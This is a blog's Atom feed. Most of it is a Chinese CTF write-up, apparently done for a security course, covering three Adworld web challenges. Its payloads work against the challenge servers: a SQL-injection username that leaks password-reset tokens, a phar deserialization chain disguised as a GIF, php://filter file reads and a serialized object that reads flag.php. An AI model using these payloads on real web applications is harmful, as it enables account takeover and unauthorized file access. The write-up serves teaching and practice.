<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Capcomin&#39;s blogs</title>
  
  
  <link href="https://zxy.link/atom.xml" rel="self"/>
  
  <link href="https://zxy.link/"/>
  <updated>2022-01-22T04:14:53.705Z</updated>
  <id>https://zxy.link/</id>
  
  <author>
    <name>Capcomin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zxy.link/posts/4a17b156/"/>
    <id>https://zxy.link/posts/4a17b156/</id>
    <published>2022-01-19T11:36:00.000Z</published>
    <updated>2022-01-22T04:14:53.705Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界Web题目WP（二）</title>
    <link href="https://zxy.link/posts/16b653c4/"/>
    <id>https://zxy.link/posts/16b653c4/</id>
    <published>2022-01-02T16:00:00.000Z</published>
    <updated>2022-01-24T12:07:51.044Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>本文是《网络安全课程设计》的一项任务 (CTF Part 2)</p></div><div class="note warning flat"><p>下文的“难度”指攻防世界的题目星级，最高为10星</p></div><h2 id="easylaravel-（难度：10-10）"><a href="#easylaravel-（难度：10-10）" class="headerlink" title="easylaravel （难度：10/10）"></a>easylaravel （难度：10/10）</h2><p>首先使用dirsearch进行目录扫描：</p><p><img src="/img/c910e9283ae98e6e7de2d24b88854afa.png"></p><p>发现了robots.txt，但为空；然后尝试打开/upload目录，需要登录，但前端注释里给了github地址，得到了网站源码。</p><p>尝试注册一个普通用户，但并没有upload功能，于是开始寻找admin账号的获取方式。在登录界面发现重置密码功能，只需要输入邮箱地址：</p><p><img src="/img/0999070b490cd11841a35a2265172dda.png"></p><p>于是开始寻找管理员邮箱。直接在源码里检索“admin@”，在<code>/easy_laravel/app/Http/Middleware/AdminMiddleware.php</code>文件里发现了管理员邮箱：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">&#x27;admin@qvq.im&#x27;</span>) &#123;  </span><br><span class="line">           <span class="keyword">return</span> redirect(route(<span class="string">&#x27;error&#x27;</span>));  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure><p>另外在源码中发现，只有使用管理员邮箱时才能访问/flag页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$flag </span>= file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);  </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>非管理员账号只能访问note页面。下面我们开始尝试获取管理员账户权限。但本题没有直接获取管理员密码的方式，只能尝试别的方法。观察下列代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint <span class="variable">$table</span></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();  </span><br><span class="line">            <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();  </span><br><span class="line">            <span class="variable">$table</span>-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>或许我们可以拿到<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#x71;&#118;&#113;&#x2e;&#x69;&#x6d;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#x71;&#118;&#113;&#x2e;&#x69;&#x6d;</a>的token，这样我们就可以重置admin密码。我们可以通过SQL注入来获取token。</p><p>注册一个用户名为<code>admin&#39; order by 6 #</code>的账号，查看note发现出现错误，如果注册一个用户名为<code>admin&#39; order by 5 #</code>的账号则不会：</p><p><img src="/img/c8e7970420e2b89896749dcf2041b517.png"></p><p>说明存在SQL注入。于是构造一个用户名为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(select token from password_resets limit 1,2),3,4,5#  </span></span><br></pre></td></tr></table></figure><p>的账号，登录后便得到了admin的token。然后访问<code>http://111.200.241.244:59568/password/reset/token</code>，修改密码即可登录admin后台，发现有文件上传页面。此时如果点击flag页面会返回“no flag”。</p><p><img src="/img/f9d37a2b54b82c55c5c090ae1d7cb7a9.png"></p><p>在源码中检索与flag有关的代码文件，找到FlagController.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$flag </span>= file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);  </span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>但显然<code>showFlag()</code>函数未被调用。在<code>check()</code>函数中发现<code>file_exists()</code>函数，因此本题应该是使用<code>phar://</code>协议进行反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">files</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$files </span>= array_except(Storage::allFiles(<span class="string">&#x27;public&#x27;</span>), [<span class="string">&#x27;0&#x27;</span>]);  </span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;files&#x27;</span>)-&gt;with(<span class="string">&#x27;files&#x27;</span>, <span class="variable">$files</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$path </span>= <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);  </span><br><span class="line">        <span class="variable">$filename </span>= <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!file_exists(<span class="variable">$path </span>. <span class="variable">$filename</span>))&#123;  </span><br><span class="line">                Flash::error(<span class="string">&#x27;磁盘文件已删除，刷新文件列表&#x27;</span>);  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                Flash::success(<span class="string">&#x27;文件有效&#x27;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>因此可以利用反序列化删除模板缓存。下面寻找一个魔术方法（例如<code>__destruct()</code>函数）来激活反序列化漏洞。TemporaryFileByteStream.php文件中 <code>Swift_ByteStream_TemporaryFileByteStream</code>类符合我们的要求，因为<code>check()</code>函数会使用<code>file_exists</code>函数，并且<code>path</code>和<code>filename</code>可控，因此可以用来构造phar文件进行反序列化攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$filePath </span>= tempnam(sys_get_temp_dir(), <span class="string">&#x27;FileByteStream&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filePath </span>=== <span class="literal">false</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to retrieve temporary file name.&#x27;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$filePath</span>, <span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContent</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$content </span>= file_get_contents(<span class="keyword">$this</span>-&gt;getPath())) === <span class="literal">false</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to get temporary file content.&#x27;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;  </span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>接下来生成phar文件。在本地运行以下php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="keyword">include</span>(autoload.php<span class="string">&#x27;);    </span></span><br><span class="line"><span class="string">    $val1 = serialize(new Swift_ByteStream_TemporaryFileByteStream());    </span></span><br><span class="line"><span class="string">    var_dump(unserialize($val1));    </span></span><br><span class="line"><span class="string">    var_dump($val1);    </span></span><br><span class="line"><span class="string">    $val1 = preg_replace(&quot;/\/private\/var\/folders\/v4\/wl2fggss4x76q3_m97bjsw780000gn\/T\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&quot;,&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $val1);    </span></span><br><span class="line"><span class="string">    var_dump($val1);    </span></span><br><span class="line"><span class="string">    $val1 = str_replace(&#x27;</span>s:<span class="number">77</span><span class="string">&#x27;, &#x27;</span>s:<span class="number">90</span><span class="string">&#x27;, $val1);    </span></span><br><span class="line"><span class="string">    $val2 = unserialize($val1);    </span></span><br><span class="line"><span class="string">    $testphar = new Phar(&#x27;</span>./<span class="number">0000001</span>.phar<span class="string">&#x27;, 0);    </span></span><br><span class="line"><span class="string">    $testphar-&gt;startBuffering();    </span></span><br><span class="line"><span class="string">    $testphar-&gt;setStub(&#x27;</span>GIF89a<span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;&#x27;);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;setMetadata($val2);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;addFromString(&#x27;fanxueliehua.txt&#x27;,&#x27;text&#x27;);    </span></span><br><span class="line"><span class="comment">    $testphar-&gt;stopBuffering();    </span></span><br><span class="line"><span class="comment">    rename(&#x27;0000001.phar&#x27;, &#x27;0000001.gif&#x27;)    </span></span><br><span class="line"><span class="comment">?&gt;    </span></span><br></pre></td></tr></table></figure><p>便可构成POP链，得到phar文件。</p><p>上传后即可得到flag。</p><h2 id="nizhuansiwei-（难度：7-10）"><a href="#nizhuansiwei-（难度：7-10）" class="headerlink" title="nizhuansiwei （难度：7/10）"></a>nizhuansiwei （难度：7/10）</h2><div class="note info flat"><p>注：因为攻防世界上本题容器创建有问题，所以本题将在buuctf上继续答题。</p></div><p>打开后首先是代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="variable">$text </span>= <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];  </span><br><span class="line"><span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password </span>= <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;  </span><br><span class="line">        <span class="keyword">exit</span>();   </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php  </span></span><br><span class="line">        <span class="variable">$password </span>= unserialize(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>这段代码主要是要我们传入一个text，然后让text参数不为空，并且<code>file_get_contents</code>函数读出<code>$text</code>变量内容为“welcome to the zjctf”。第二个if语句是说<code>$file</code>中不能包含关键字flag，满足要求后反序列化<code>$password</code>变量，最后输出<code>$password</code>。</p><p>首先考虑第一个if语句，使用伪协议data://text并且对字符串welcome to the zjctf进行base64编码。Payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  </span></span><br></pre></td></tr></table></figure><p>然后考虑第二个if语句。要满足<code>$file</code>不含有“flag”字符串，注释提示我们可能要用 useless.php。因此还是用php伪协议，先读取useless.php的代码。Payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php  </span></span><br></pre></td></tr></table></figure><p>得到一串base64字符，解码得到useless.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;    </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);   </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>注释中的flag.php就是我们最后要找的目标。要把useless.php序列化，只需要在最后加上这三行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Flag();  </span><br><span class="line"><span class="variable">$a</span>= serialize(<span class="variable">$a</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;   </span><br></pre></td></tr></table></figure><p>然后执行php文件即可，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure><p>最后把序列化后的代码放在php伪协议的最后即可得到Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;  </span></span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="/img/18e4cc866d8e178fe1c146964821fbb5.png"></p><h2 id="Guess-（难度：10-10）"><a href="#Guess-（难度：10-10）" class="headerlink" title="Guess （难度：10/10）"></a>Guess （难度：10/10）</h2><p>打开后是一个图片上传页面：</p><p><img src="/img/ca395cc49afa63b5e34fb146e175b4aa.png"></p><p>首先用dirsearch扫描目录：</p><p><img src="/img/a24f361596f4e578a3f35872765b11e4.png">没有有用信息，应该只能从上传图片入手。直接上传的话会被直接阻止，过滤应该很严格。</p><p><img src="/img/836aac181b51132b3f96f86a595fcc4b.png"></p><p>该页面URL参数为<code>?page=upload</code>，可能存在文件读取等漏洞，试一下伪协议读取源代码。首先试一下读取index主页的源代码，输入<code>http://111.200.241.244:58338/?page=php://filter/convert.base64-encode/resource=index</code>，成功读取：</p><p><img src="/img/f7b55e5e3d1ed72ae18ac7a4848ec1a5.png">Base64解码一下得到主页的源码（下面所有代码我只截取php部分，省略掉前端HTML没有价值的部分）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">session_start();  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="variable">$page</span>=<span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,<span class="variable">$page</span>))  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$page</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">include</span>(<span class="variable">$page</span>.<span class="string">&#x27;.php&#x27;</span>)))  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;error!&lt;/div&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">exit</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>可以看到<code>preg_match</code>函数过滤掉了一些字符，并且用<code>include</code>做了一些限制。下面我们来获取upload页面的源代码。输入<code>http://111.200.241.244:58338/?page=php://filter/convert.base64-encode/resource=upload</code>，解码一下便得到了源码，显然包含更多信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span>(<span class="params"><span class="variable">$message</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i 